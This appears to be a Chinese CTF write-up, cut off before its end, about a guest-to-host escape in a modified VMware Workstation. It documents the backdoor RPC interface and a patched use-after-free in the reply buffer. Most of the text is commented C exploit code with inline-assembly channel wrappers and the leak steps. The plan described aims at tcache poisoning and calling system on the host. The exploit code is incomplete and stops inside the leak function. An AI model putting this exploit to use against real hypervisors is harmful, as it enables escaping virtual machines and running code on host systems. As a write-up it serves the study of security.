EBX set to 00007465h (&quot;et\x00\x00&quot;)
&lt;/code&gt;&lt;p&gt;ECX会返回是否成功，具体实现如下：&lt;/p&gt;&lt;code lang=&quot;text&quot;&gt;
void channel_send_data(int cookie1,int cookie2,int channel_num,int len,char *data,int *res){
	asm(&quot;pushq %%rbp\n\t&quot;
                &quot;movq %%r9,%%r10\n\t&quot;
		&quot;movq %%r8,%%rbp\n\t&quot;
		&quot;movq %%rcx,%%r11\n\t&quot;
		&quot;movq $0,%%r12\n\t&quot;
		&quot;1:\n\t&quot;
		&quot;movq %%r8,%%rbp\n\t&quot;
		&quot;add %%r12,%%rbp\n\t&quot;
		&quot;movl (%%rbp),%%ebx\n\t&quot;
                &quot;movl $0x564d5868,%%eax\n\t&quot;
                &quot;movl $0x0002001e,%%ecx\n\t&quot;
		&quot;movw $0x5658,%%dx\n\t&quot;
                &quot;out %%eax,%%dx\n\t&quot;
		&quot;addq $4,%%r12\n\t&quot;
		&quot;cmpq %%r12,%%r11\n\t&quot;
		&quot;ja 1b\n\t&quot;
		&quot;movl %%ecx,(%%r10)\n\t&quot;
		&quot;popq %%rbp\n\t&quot;
                :
                :
                :&quot;%rax&quot;,&quot;%rbx&quot;,&quot;%rcx&quot;,&quot;%rdx&quot;,&quot;%rsi&quot;,&quot;%rdi&quot;,&quot;%r10&quot;,&quot;%r11&quot;,&quot;%r12&quot;
        );
}
&lt;/code&gt;&lt;h2&gt;Recieve RPC reply length&lt;/h2&gt;&lt;blockquote&gt;RPC subcommand：03h&lt;/blockquote&gt;&lt;p&gt;调用：&lt;/p&gt;&lt;code lang=&quot;text&quot;&gt;
EAX = 564D5868h - magic number
ECX(HI) = 0003h - subcommand number
ECX(LO) = 001Eh - command number
EDX(HI) = channel number
EDX(LO) = 5658h - port number
&lt;/code&gt;&lt;p&gt;返回值：&lt;/p&gt;&lt;code lang=&quot;text&quot;&gt;
EBX = reply length (not including the terminating NULL)
ECX = 00830000h: success / 00000000h: failure
&lt;/code&gt;&lt;p&gt;接收RPC reply的长度。需要注意的是所有的RPC command都会返回至少2个字节的reply的数据，其中&lt;code class=&quot;inline&quot;&gt;1&lt;/code&gt;表示&lt;code class=&quot;inline&quot;&gt;success&lt;/code&gt;,&lt;code class=&quot;inline&quot;&gt;0&lt;/code&gt;表示&lt;code class=&quot;inline&quot;&gt;failure&lt;/code&gt;，即使VMware无法识别RPC command，也会返回&lt;code class=&quot;inline&quot;&gt;0 Unknown command&lt;/code&gt;作为reply。也就是说，reply数据的前两个字节始终表示RPC command命令的状态。&lt;/p&gt;&lt;code lang=&quot;text&quot;&gt;
void channel_recv_reply_len(int cookie1,int cookie2,int channel_num,int *len,int *res){
	asm(&quot;movl %%eax,%%ebx\n\t&quot;
                &quot;movq %%r8,%%r10\n\t&quot;
                &quot;movq %%rcx,%%r11\n\t&quot;
                &quot;movl $0x564d5868,%%eax\n\t&quot;
                &quot;movl $0x0003001e,%%ecx\n\t&quot;
                &quot;movw $0x5658,%%dx\n\t&quot;
                &quot;out %%eax,%%dx\n\t&quot;
                &quot;movl %%ecx,(%%r10)\n\t&quot;
		&quot;movl %%ebx,(%%r11)\n\t&quot;
                :
                :
                :&quot;%rax&quot;,&quot;%rbx&quot;,&quot;%rcx&quot;,&quot;%rdx&quot;,&quot;%rsi&quot;,&quot;%rdi&quot;,&quot;%r10&quot;,&quot;%r11&quot;
        );
		
}
&lt;/code&gt;&lt;h2&gt;Receive RPC reply data&lt;/h2&gt;&lt;blockquote&gt;RPC subcommand：04h&lt;/blockquote&gt;&lt;p&gt;调用：&lt;/p&gt;&lt;code lang=&quot;text&quot;&gt;
EAX = 564D5868h - magic number
EBX = reply type from subcommand 03h
ECX(HI) = 0004h - subcommand number
ECX(LO) = 001Eh - command number
EDX(HI) = channel number
EDX(LO) = 5658h - port number
&lt;/code&gt;&lt;p&gt;返回：&lt;/p&gt;&lt;code lang=&quot;text&quot;&gt;
EBX = 4 bytes from the reply data (the first byte in LSB)
ECX = 00010000h: success / 00000000h: failure
&lt;/code&gt;&lt;p&gt;和&lt;code class=&quot;inline&quot;&gt;https://sites.google.com/site/chitchatvmback/backdoor&lt;/code&gt;中有出入的是，在实际的逆向分析中，EBX中存放的值，不是reply id，而是reply type，他决定了执行的路径。和发送数据一样，每次只能够接受4个字节的数据。需要注意的是，我们在&lt;code class=&quot;inline&quot;&gt;Recieve RPC reply length&lt;/code&gt;中提到过，应答数据的前两个字节始终表示RPC command的状态。举例说明，如果我们使用RPC command询问&lt;code class=&quot;inline&quot;&gt;machine.id.get&lt;/code&gt;，如果成功的话，会返回&lt;code class=&quot;inline&quot;&gt;1 &amp;lt;virtual machine id&amp;gt;&lt;/code&gt;，否则为&lt;code class=&quot;inline&quot;&gt;0 No machine id&lt;/code&gt;。&lt;/p&gt;&lt;code lang=&quot;text&quot;&gt;
void channel_recv_data(int cookie1,int cookie2,int channel_num,int offset,char *data,int *res){
	asm(&quot;pushq %%rbp\n\t&quot;
                &quot;movq %%r9,%%r10\n\t&quot;
                &quot;movq %%r8,%%rbp\n\t&quot;
                &quot;movq %%rcx,%%r11\n\t&quot;
                &quot;movq $1,%%rbx\n\t&quot;
		&quot;movl $0x564d5868,%%eax\n\t&quot;
                &quot;movl $0x0004001e,%%ecx\n\t&quot;
                &quot;movw $0x5658,%%dx\n\t&quot;
                &quot;in %%dx,%%eax\n\t&quot;
		&quot;add %%r11,%%rbp\n\t&quot;
                &quot;movl %%ebx,(%%rbp)\n\t&quot;
                &quot;movl %%ecx,(%%r10)\n\t&quot;
                &quot;popq %%rbp\n\t&quot;
                :
                :
                :&quot;%rax&quot;,&quot;%rbx&quot;,&quot;%rcx&quot;,&quot;%rdx&quot;,&quot;%rsi&quot;,&quot;%rdi&quot;,&quot;%r10&quot;,&quot;%r11&quot;,&quot;%r12&quot;
        );
}
&lt;/code&gt;&lt;h2&gt;Finish receiving RPC reply&lt;/h2&gt;&lt;blockquote&gt;RPC subcommand：05h&lt;/blockquote&gt;&lt;p&gt;调用：&lt;/p&gt;&lt;code lang=&quot;text&quot;&gt;
EAX = 564D5868h - magic number
EBX = reply type from subcommand 03h
ECX(HI) = 0005h - subcommand number
ECX(LO) = 001Eh - command number
EDX(HI) = channel number
EDX(LO) = 5658h - port number
&lt;/code&gt;&lt;p&gt;返回：&lt;/p&gt;&lt;code lang=&quot;text&quot;&gt;
ECX = 00010000h: success / 00000000h: failure
&lt;/code&gt;&lt;p&gt;和前文所述一样，在EBX中存储的是reply type。在接收完reply的数据后，调用此命令。如果没有通过&lt;code class=&quot;inline&quot;&gt;Receive RPC reply data&lt;/code&gt;接收完整个reply数据的话，就会返回failure。&lt;/p&gt;&lt;code lang=&quot;text&quot;&gt;
void channel_recv_finish(int cookie1,int cookie2,int channel_num,int *res){
	asm(&quot;movl %%eax,%%ebx\n\t&quot;
                &quot;movq %%rcx,%%r10\n\t&quot;
		&quot;movq $0x1,%%rbx\n\t&quot;
                &quot;movl $0x564d5868,%%eax\n\t&quot;
                &quot;movl $0x0005001e,%%ecx\n\t&quot;
                &quot;movw $0x5658,%%dx\n\t&quot;
                &quot;out %%eax,%%dx\n\t&quot;
                &quot;movl %%ecx,(%%r10)\n\t&quot;
                :
                :
                :&quot;%rax&quot;,&quot;%rbx&quot;,&quot;%rcx&quot;,&quot;%rdx&quot;,&quot;%rsi&quot;,&quot;%rdi&quot;,&quot;%r10&quot;
        );
}
&lt;/code&gt;&lt;h2&gt;Close RPC channel&lt;/h2&gt;&lt;blockquote&gt;RPC subcommand：06h&lt;/blockquote&gt;&lt;p&gt;调用：&lt;/p&gt;&lt;code lang=&quot;text&quot;&gt;
EAX = 564D5868h - magic number
ECX(HI) = 0006h - subcommand number
ECX(LO) = 001Eh - command number
EDX(HI) = channel number
EDX(LO) = 5658h - port number
&lt;/code&gt;&lt;p&gt;返回：&lt;/p&gt;&lt;code lang=&quot;text&quot;&gt;
ECX = 00010000h: success / 00000000h: failure
&lt;/code&gt;&lt;p&gt;关闭channel。&lt;/p&gt;&lt;code lang=&quot;text&quot;&gt;
void channel_close(int cookie1,int cookie2,int channel_num,int *res){
	asm(&quot;movl %%eax,%%ebx\n\t&quot;
                &quot;movq %%rcx,%%r10\n\t&quot;
                &quot;movl $0x564d5868,%%eax\n\t&quot;
                &quot;movl $0x0006001e,%%ecx\n\t&quot;
                &quot;movw $0x5658,%%dx\n\t&quot;
                &quot;out %%eax,%%dx\n\t&quot;
                &quot;movl %%ecx,(%%r10)\n\t&quot;
                :
                :
                :&quot;%rax&quot;,&quot;%rbx&quot;,&quot;%rcx&quot;,&quot;%rdx&quot;,&quot;%rsi&quot;,&quot;%rdi&quot;,&quot;%r10&quot;
        );
}
&lt;/code&gt;&lt;h2&gt;漏洞分析&lt;/h2&gt;&lt;p&gt;虽然是RealWorld的竞赛，但是因为是魔改的VMWare Workstation，因此我们通过二进制比对的方式可以快速定位到漏洞点，节省大量的二进制程序审计和漏洞挖掘的时间。&lt;br&gt;&lt;/p&gt;&lt;img src=&quot;https://pic3.zhimg.com/v2-11b9dd2df64de27dfc3d95bf6d0fbaeb_r.jpg&quot; data-caption=&quot;&quot; data-size=&quot;normal&quot; data-rawwidth=&quot;410&quot; data-rawheight=&quot;98&quot; data-watermark=&quot;watermark&quot; data-original-src=&quot;v2-11b9dd2df64de27dfc3d95bf6d0fbaeb&quot; data-watermark-src=&quot;v2-43e396613fc9d1538cda308aa2f285ea&quot; data-private-watermark-src=&quot;&quot;&gt;&lt;p&gt;&lt;br&gt;可以发现出题人仅仅修改了两处，一处在0x1893c9，另一处在0x1893e6。分别对两个位置进行分析：&lt;br&gt;&lt;/p&gt;&lt;img src=&quot;https://pic4.zhimg.com/v2-9ab45eb7842b3564ab2a74edce782ae6_r.jpg&quot; data-caption=&quot;&quot; data-size=&quot;normal&quot; data-rawwidth=&quot;554&quot; data-rawheight=&quot;115&quot; data-watermark=&quot;watermark&quot; data-original-src=&quot;v2-9ab45eb7842b3564ab2a74edce782ae6&quot; data-watermark-src=&quot;v2-d644da4953a25ed3d32e9584deaf3273&quot; data-private-watermark-src=&quot;&quot;&gt;&lt;p&gt;&lt;br&gt;首先在0x1893c9处，channel-&amp;gt;out_msg_buf置null的操作被nop掉了：&lt;br&gt;&lt;/p&gt;&lt;img src=&quot;https://pic2.zhimg.com/v2-57a1fd9b5d741fc17f23632baf84f4c0_r.jpg&quot; data-caption=&quot;&quot; data-size=&quot;normal&quot; data-rawwidth=&quot;510&quot; data-rawheight=&quot;192&quot; data-watermark=&quot;watermark&quot; data-original-src=&quot;v2-57a1fd9b5d741fc17f23632baf84f4c0&quot; data-watermark-src=&quot;v2-33ec580462e549d3c2900a0beba4345e&quot; data-private-watermark-src=&quot;&quot;&gt;&lt;p&gt;&lt;br&gt;其次在0x1893e6处的函数调用中，v7&amp;amp;1变成了v7&amp;amp;0x21：&lt;br&gt;&lt;/p&gt;&lt;img src=&quot;https://pic2.zhimg.com/v2-c4b0a295f323919165bbf2b1072c904b_r.jpg&quot; data-caption=&quot;&quot; data-size=&quot;normal&quot; data-rawwidth=&quot;596&quot; data-rawheight=&quot;68&quot; data-watermark=&quot;&quot; data-original-src=&quot;&quot; data-watermark-src=&quot;&quot; data-private-watermark-src=&quot;&quot;&gt;&lt;p&gt;&lt;br&gt;在第一处patch中，out_msg_buf没有被置空，其次在第二处patch中，原先被限制的reply type(&amp;amp;0x1)变成了&amp;amp;0x21,也就是说，我们在Finish receiving RPC reply的reply type中可以设置另外一条路径，这条路径会导致在随后的&lt;code class=&quot;inline&quot;&gt;v6&lt;/code&gt;这个调用(它会call函数&lt;code class=&quot;inline&quot;&gt;sub_177700&lt;/code&gt;)，&lt;code class=&quot;inline&quot;&gt;output buffer&lt;/code&gt;被&lt;code class=&quot;inline&quot;&gt;free&lt;/code&gt;掉。&lt;/p&gt;&lt;p&gt;&lt;br&gt;&lt;/p&gt;&lt;img src=&quot;https://pic2.zhimg.com/v2-9b42079bc70985838aab4885e2d58353_r.jpg&quot; data-caption=&quot;&quot; data-size=&quot;normal&quot; data-rawwidth=&quot;640&quot; data-rawheight=&quot;112&quot; data-watermark=&quot;watermark&quot; data-original-src=&quot;v2-9b42079bc70985838aab4885e2d58353&quot; data-watermark-src=&quot;v2-6bd011e5aa1a8517146ed58108e6cb9b&quot; data-private-watermark-src=&quot;&quot;&gt;&lt;p&gt;&lt;br&gt;&lt;/p&gt;&lt;code lang=&quot;text&quot;&gt;
void channel_recv_finish2(int cookie1,int cookie2,int channel_num,int *res){
        asm(&quot;movl %%eax,%%ebx\n\t&quot;
                &quot;movq %%rcx,%%r10\n\t&quot;
                &quot;movq $0x21,%%rbx\n\t&quot;
                &quot;movl $0x564d5868,%%eax\n\t&quot;
                &quot;movl $0x0005001e,%%ecx\n\t&quot;
                &quot;movw $0x5658,%%dx\n\t&quot;
                &quot;out %%eax,%%dx\n\t&quot;
                &quot;movl %%ecx,(%%r10)\n\t&quot;
                :
                :
                :&quot;%rax&quot;,&quot;%rbx&quot;,&quot;%rcx&quot;,&quot;%rdx&quot;,&quot;%rsi&quot;,&quot;%rdi&quot;,&quot;%r10&quot;
        );
}
&lt;/code&gt;&lt;h2&gt;漏洞利用&lt;/h2&gt;&lt;p&gt;由上面的分析可以知，这个patch会导致&lt;code class=&quot;inline&quot;&gt;UAF&lt;/code&gt;:如果我们在接收完成之后设置了&lt;code class=&quot;inline&quot;&gt;0x20&lt;/code&gt;这个位，那么&lt;code class=&quot;inline&quot;&gt;output buffer&lt;/code&gt;就会被释放掉，但由于它没有被清零，所以理论上我们可以无限次的将它&lt;code class=&quot;inline&quot;&gt;free&lt;/code&gt;掉。有了这些条件，我们要完成整个利用就不难了。&lt;/p&gt;&lt;p&gt;利用步骤如下:&lt;br&gt;&lt;code class=&quot;inline&quot;&gt;Leak:&lt;/code&gt;&lt;/p&gt;&lt;ol&gt;&lt;li&gt;开两个&lt;code class=&quot;inline&quot;&gt;channel:A，B&lt;/code&gt;&lt;/li&gt;&lt;li&gt;&lt;code class=&quot;inline&quot;&gt;A&lt;/code&gt;的&lt;code class=&quot;inline&quot;&gt;output buffer&lt;/code&gt;为&lt;code class=&quot;inline&quot;&gt;buf_A&lt;/code&gt;,然后&lt;code class=&quot;inline&quot;&gt;A&lt;/code&gt;释放&lt;code class=&quot;inline&quot;&gt;buf_A&lt;/code&gt;&lt;/li&gt;&lt;li&gt;这时让&lt;code class=&quot;inline&quot;&gt;B&lt;/code&gt;准备给&lt;code class=&quot;inline&quot;&gt;guest&lt;/code&gt;发&lt;code class=&quot;inline&quot;&gt;output&lt;/code&gt;,&lt;code class=&quot;inline&quot;&gt;B&lt;/code&gt;会分配一个&lt;code class=&quot;inline&quot;&gt;buffer&lt;/code&gt;，我们利用&lt;code class=&quot;inline&quot;&gt;info-set&lt;/code&gt;和&lt;code class=&quot;inline&quot;&gt;info-get&lt;/code&gt;来控制我们分配的&lt;code class=&quot;inline&quot;&gt;buffer&lt;/code&gt;大小，使得&lt;code class=&quot;inline&quot;&gt;B&lt;/code&gt;的&lt;code class=&quot;inline&quot;&gt;output buffer: buf_B=buf_A&lt;/code&gt;。&lt;/li&gt;&lt;li&gt;&lt;code class=&quot;inline&quot;&gt;A&lt;/code&gt;再次释放&lt;code class=&quot;inline&quot;&gt;buf_A&lt;/code&gt;，这也导致了&lt;code class=&quot;inline&quot;&gt;buf_B&lt;/code&gt;被释放。这个时候我们就可以&lt;code class=&quot;inline&quot;&gt;leak&lt;/code&gt;出&lt;code class=&quot;inline&quot;&gt;buf_B&lt;/code&gt;的&lt;code class=&quot;inline&quot;&gt;fd&lt;/code&gt;了,但是这个指针没有什么用，我们想要的是&lt;code class=&quot;inline&quot;&gt;text base&lt;/code&gt;。&lt;/li&gt;&lt;li&gt;因此我们再执行命令&lt;code class=&quot;inline&quot;&gt;vmx.capability.dnd_version&lt;/code&gt;,这会让&lt;code class=&quot;inline&quot;&gt;host&lt;/code&gt;分配一块内存来存放一个&lt;code class=&quot;inline&quot;&gt;obj&lt;/code&gt;,通过控制&lt;code class=&quot;inline&quot;&gt;buffer&lt;/code&gt;大小我们可以刚好让&lt;code class=&quot;inline&quot;&gt;buf_B&lt;/code&gt;被用来存放一个&lt;code class=&quot;inline&quot;&gt;obj&lt;/code&gt;。而这个&lt;code class=&quot;inline&quot;&gt;obj&lt;/code&gt;里面有&lt;code class=&quot;inline&quot;&gt;vtable&lt;/code&gt;,我们可以&lt;code class=&quot;inline&quot;&gt;leak&lt;/code&gt;出来计算&lt;code class=&quot;inline&quot;&gt;text base&lt;/code&gt;。注意我们一直没有接受&lt;code class=&quot;inline&quot;&gt;B&lt;/code&gt;的输出，只是让它做好准备(分配output buffer)。直到这个时候我们才接受它的输出，完成&lt;code class=&quot;inline&quot;&gt;leak&lt;/code&gt;&lt;/li&gt;&lt;/ol&gt;&lt;p&gt;&lt;code class=&quot;inline&quot;&gt;Exploit&lt;/code&gt;&lt;/p&gt;&lt;p&gt;有了&lt;code class=&quot;inline&quot;&gt;leak&lt;/code&gt;的方法，&lt;code class=&quot;inline&quot;&gt;exploit&lt;/code&gt;的也是类似的了。简单来说就是&lt;code class=&quot;inline&quot;&gt;UAF&lt;/code&gt;，把&lt;code class=&quot;inline&quot;&gt;tcache&lt;/code&gt;的&lt;code class=&quot;inline&quot;&gt;fd&lt;/code&gt;改到&lt;code class=&quot;inline&quot;&gt;bss&lt;/code&gt;段，然后改函数指针为&lt;code class=&quot;inline&quot;&gt;system&lt;/code&gt;,最后弹&lt;code class=&quot;inline&quot;&gt;calculator&lt;/code&gt;&lt;/p&gt;&lt;p&gt;我给作者的exp加上了注释，大家可以参考:&lt;/p&gt;&lt;code lang=&quot;text&quot;&gt;
#include &amp;lt;stdio.h&amp;gt;
#include &amp;lt;stdint.h&amp;gt;
void channel_open(int *cookie1,int *cookie2,int *channel_num,int *res){
    asm(&quot;movl %%eax,%%ebx\n\t&quot;
        &quot;movq %%rdi,%%r10\n\t&quot;
        &quot;movq %%rsi,%%r11\n\t&quot;
        &quot;movq %%rdx,%%r12\n\t&quot;
        &quot;movq %%rcx,%%r13\n\t&quot;
        &quot;movl $0x564d5868,%%eax\n\t&quot;
        &quot;movl $0xc9435052,%%ebx\n\t&quot;
        &quot;movl $0x1e,%%ecx\n\t&quot;
        &quot;movl $0x5658,%%edx\n\t&quot;
        &quot;out %%eax,%%dx\n\t&quot;
        &quot;movl %%edi,(%%r10)\n\t&quot;
        &quot;movl %%esi,(%%r11)\n\t&quot;
        &quot;movl %%edx,(%%r12)\n\t&quot;
        &quot;movl %%ecx,(%%r13)\n\t&quot;
        :
        :
        :&quot;%rax&quot;,&quot;%rbx&quot;,&quot;%rcx&quot;,&quot;%rdx&quot;,&quot;%rsi&quot;,&quot;%rdi&quot;,&quot;%r8&quot;,&quot;%r10&quot;,&quot;%r11&quot;,&quot;%r12&quot;,&quot;%r13&quot;
       );
}

void channel_set_len(int cookie1,int cookie2,int channel_num,int len,int *res){
    asm(&quot;movl %%eax,%%ebx\n\t&quot;
        &quot;movq %%r8,%%r10\n\t&quot;
        &quot;movl %%ecx,%%ebx\n\t&quot;
        &quot;movl $0x564d5868,%%eax\n\t&quot;
        &quot;movl $0x0001001e,%%ecx\n\t&quot;
        &quot;movw $0x5658,%%dx\n\t&quot;
        &quot;out %%eax,%%dx\n\t&quot;
        &quot;movl %%ecx,(%%r10)\n\t&quot;
        :
        :
        :&quot;%rax&quot;,&quot;%rbx&quot;,&quot;%rcx&quot;,&quot;%rdx&quot;,&quot;%rsi&quot;,&quot;%rdi&quot;,&quot;%r10&quot;
       );
}

void channel_send_data(int cookie1,int cookie2,int channel_num,int len,char *data,int *res){
    asm(&quot;pushq %%rbp\n\t&quot;
        &quot;movq %%r9,%%r10\n\t&quot;
        &quot;movq %%r8,%%rbp\n\t&quot;
        &quot;movq %%rcx,%%r11\n\t&quot;
        &quot;movq $0,%%r12\n\t&quot;
        &quot;1:\n\t&quot;
        &quot;movq %%r8,%%rbp\n\t&quot;
        &quot;add %%r12,%%rbp\n\t&quot;
        &quot;movl (%%rbp),%%ebx\n\t&quot;
        &quot;movl $0x564d5868,%%eax\n\t&quot;
        &quot;movl $0x0002001e,%%ecx\n\t&quot;
        &quot;movw $0x5658,%%dx\n\t&quot;
        &quot;out %%eax,%%dx\n\t&quot;
        &quot;addq $4,%%r12\n\t&quot;
        &quot;cmpq %%r12,%%r11\n\t&quot;
        &quot;ja 1b\n\t&quot;
        &quot;movl %%ecx,(%%r10)\n\t&quot;
        &quot;popq %%rbp\n\t&quot;
        :
        :
        :&quot;%rax&quot;,&quot;%rbx&quot;,&quot;%rcx&quot;,&quot;%rdx&quot;,&quot;%rsi&quot;,&quot;%rdi&quot;,&quot;%r10&quot;,&quot;%r11&quot;,&quot;%r12&quot;
        );
}

void channel_recv_reply_len(int cookie1,int cookie2,int channel_num,int *len,int *res){
    asm(&quot;movl %%eax,%%ebx\n\t&quot;
        &quot;movq %%r8,%%r10\n\t&quot;
        &quot;movq %%rcx,%%r11\n\t&quot;
        &quot;movl $0x564d5868,%%eax\n\t&quot;
        &quot;movl $0x0003001e,%%ecx\n\t&quot;
        &quot;movw $0x5658,%%dx\n\t&quot;
        &quot;out %%eax,%%dx\n\t&quot;
        &quot;movl %%ecx,(%%r10)\n\t&quot;
        &quot;movl %%ebx,(%%r11)\n\t&quot;
        :
        :
        :&quot;%rax&quot;,&quot;%rbx&quot;,&quot;%rcx&quot;,&quot;%rdx&quot;,&quot;%rsi&quot;,&quot;%rdi&quot;,&quot;%r10&quot;,&quot;%r11&quot;
       );

}

void channel_recv_data(int cookie1,int cookie2,int channel_num,int offset,char *data,int *res){
    asm(&quot;pushq %%rbp\n\t&quot;
        &quot;movq %%r9,%%r10\n\t&quot;
        &quot;movq %%r8,%%rbp\n\t&quot;
        &quot;movq %%rcx,%%r11\n\t&quot;
        &quot;movq $1,%%rbx\n\t&quot;
        &quot;movl $0x564d5868,%%eax\n\t&quot;
        &quot;movl $0x0004001e,%%ecx\n\t&quot;
        &quot;movw $0x5658,%%dx\n\t&quot;
        &quot;in %%dx,%%eax\n\t&quot;
        &quot;add %%r11,%%rbp\n\t&quot;
        &quot;movl %%ebx,(%%rbp)\n\t&quot;
        &quot;movl %%ecx,(%%r10)\n\t&quot;
        &quot;popq %%rbp\n\t&quot;
        :
        :
        :&quot;%rax&quot;,&quot;%rbx&quot;,&quot;%rcx&quot;,&quot;%rdx&quot;,&quot;%rsi&quot;,&quot;%rdi&quot;,&quot;%r10&quot;,&quot;%r11&quot;,&quot;%r12&quot;
       );
}

void channel_recv_finish(int cookie1,int cookie2,int channel_num,int *res){
    asm(&quot;movl %%eax,%%ebx\n\t&quot;
        &quot;movq %%rcx,%%r10\n\t&quot;
        &quot;movq $0x1,%%rbx\n\t&quot;
        &quot;movl $0x564d5868,%%eax\n\t&quot;
        &quot;movl $0x0005001e,%%ecx\n\t&quot;
        &quot;movw $0x5658,%%dx\n\t&quot;
        &quot;out %%eax,%%dx\n\t&quot;
        &quot;movl %%ecx,(%%r10)\n\t&quot;
        :
        :
        :&quot;%rax&quot;,&quot;%rbx&quot;,&quot;%rcx&quot;,&quot;%rdx&quot;,&quot;%rsi&quot;,&quot;%rdi&quot;,&quot;%r10&quot;
       );
}
void channel_recv_finish2(int cookie1,int cookie2,int channel_num,int *res){
    asm(&quot;movl %%eax,%%ebx\n\t&quot;
        &quot;movq %%rcx,%%r10\n\t&quot;
        &quot;movq $0x21,%%rbx\n\t&quot;
        &quot;movl $0x564d5868,%%eax\n\t&quot;
        &quot;movl $0x0005001e,%%ecx\n\t&quot;
        &quot;movw $0x5658,%%dx\n\t&quot;
        &quot;out %%eax,%%dx\n\t&quot;
        &quot;movl %%ecx,(%%r10)\n\t&quot;
        :
        :
        :&quot;%rax&quot;,&quot;%rbx&quot;,&quot;%rcx&quot;,&quot;%rdx&quot;,&quot;%rsi&quot;,&quot;%rdi&quot;,&quot;%r10&quot;
       );
}
void channel_close(int cookie1,int cookie2,int channel_num,int *res){
    asm(&quot;movl %%eax,%%ebx\n\t&quot;
        &quot;movq %%rcx,%%r10\n\t&quot;
        &quot;movl $0x564d5868,%%eax\n\t&quot;
        &quot;movl $0x0006001e,%%ecx\n\t&quot;
        &quot;movw $0x5658,%%dx\n\t&quot;
        &quot;out %%eax,%%dx\n\t&quot;
        &quot;movl %%ecx,(%%r10)\n\t&quot;
        :
        :
        :&quot;%rax&quot;,&quot;%rbx&quot;,&quot;%rcx&quot;,&quot;%rdx&quot;,&quot;%rsi&quot;,&quot;%rdi&quot;,&quot;%r10&quot;
       );
}
struct channel{
    int cookie1;
    int cookie2;
    int num;
};
uint64_t heap =0;
uint64_t text =0;
void run_cmd(char *cmd){
    struct channel tmp;
    int res,len,i;
    char *data;
    channel_open(&amp;amp;tmp.cookie1,&amp;amp;tmp.cookie2,&amp;amp;tmp.num,&amp;amp;res);
    if(!res){
        printf(&quot;fail to open channel!\n&quot;);
        return;
    }
    channel_set_len(tmp.cookie1,tmp.cookie2,tmp.num,strlen(cmd),&amp;amp;res);
    if(!res){
        printf(&quot;fail to set len\n&quot;);
        return;
    }
    channel_send_data(tmp.cookie1,tmp.cookie2,tmp.num,strlen(cmd)+0x10,cmd,&amp;amp;res);

    channel_recv_reply_len(tmp.cookie1,tmp.cookie2,tmp.num,&amp;amp;len,&amp;amp;res);
    if(!res){
        printf(&quot;fail to recv data len\n&quot;);
        return;
    }
    printf(&quot;recv len:%d\n&quot;,len);
    data = malloc(len+0x10);
    memset(data,0,len+0x10);
    for(i=0;i&amp;lt;len+0x10;i+=4){
        channel_recv_data(tmp.cookie1,tmp.cookie2,tmp.num,i,data,&amp;amp;res);
    }
    printf(&quot;recv data:%s\n&quot;,data);
    channel_recv_finish(tmp.cookie1,tmp.cookie2,tmp.num,&amp;amp;res);
    if(!res){
        printf(&quot;fail to recv finish\n&quot;);
    }

    channel_close(tmp.cookie1,tmp.cookie2,tmp.num,&amp;amp;res);
    if(!res){
        printf(&quot;fail to close channel\n&quot;);
        return;
    }
}
void leak(){
    struct channel chan[10];
    int res=0;
    int len,i;	
    char pay[8192];
    char *s1 = &quot;info-set guestinfo.a AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA&quot;;
    char *data;
    char *s2 = &quot;info-get guestinfo.a&quot;;
    char *s3 = &quot;1 AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA&quot;;
    char *s4 = &quot;tools.capability.dnd_version 4&quot;;
    char *s5 = &quot;vmx.capability.dnd_version&quot;;
    //init data
    run_cmd(s1); // set the message len to be 0x100, so when we call info-get ,we will call malloc(0x100);
    run_cmd(s4);


    //first step 
    channel_open(&amp;amp;chan[0].cookie1,&amp;amp;chan[0].cookie2,&amp;amp;chan[0].num,&amp;amp;res);
    if(!res){
        printf(&quot;fail to open channel!\n&quot;);
        return;
    }
    channel_set_len(chan[0].cookie1,chan[0].cookie2,chan[0].num,strlen(s2),&amp;amp;res);
    if(!res){
        printf(&quot;fail to set len\n&quot;);
        return;
    }
    channel_send_data(chan[0].cookie1,chan[0].cookie2,chan[0].num,strlen(s2),s2,&amp;amp;res);
    channel_recv_reply_len(chan[0].cookie1,chan[0].cookie2,chan[0].num,&amp;amp;len,&amp;amp;res);
    if(!res){
        printf(&quot;fail to recv data len\n&quot;);
        return;
    }
    printf(&quot;recv len:%d\n&quot;,len);
    data = malloc(len+0x10);
    memset(data,0,len+0x10);
    for(i=0;i&amp;lt;len+0x10;i++){
        channel_recv_data(chan[0].cookie1,chan[0].cookie2,chan[0].num,i,data,&amp;amp;res);
    }
    printf(&quot;recv data:%s\n&quot;,data);
    //second step free the reply and let the other channel get it.

    channel_open(&amp;amp;chan[1].cookie1,&amp;amp;chan[1].cookie2,&amp;amp;chan[1].num,&amp;amp;res);
    if(!res){
        printf(&quot;fail to open channel!\n&quot;);
        return;
    }
    channel_set_len(chan[1].cookie1,chan[1].cookie2,chan[1].num,strlen(s2),&amp;amp;res);
    if(!res){
        printf(&quot;fail to set len\n&quot;);
        return;
    }

    channel_send_data(chan[1].cookie1,chan[1].cookie2,chan[1].num,strlen(s2)-4,s2,&amp;amp;res);
    if(!res){
        printf(&quot;fail to send data\n&quot;);
        return;
    }

    //free the output buffer
    printf(&quot;Freeing the buffer....,bp:0x5555556DD3EF\n&quot;);
    getchar();
    channel_recv_finish2(chan[0].cookie1,chan[0].cookie2,chan[0].num,&amp;amp;res);
    if(!res){
        printf(&quot;fail to recv finish1\n&quot;);
        return;
    }
    //finished sending the command, should get the freed buffer
    printf(&quot;Finishing sending the buffer , should allocate the buffer..,bp:0x5555556DD5BC\n&quot;);
    getchar();
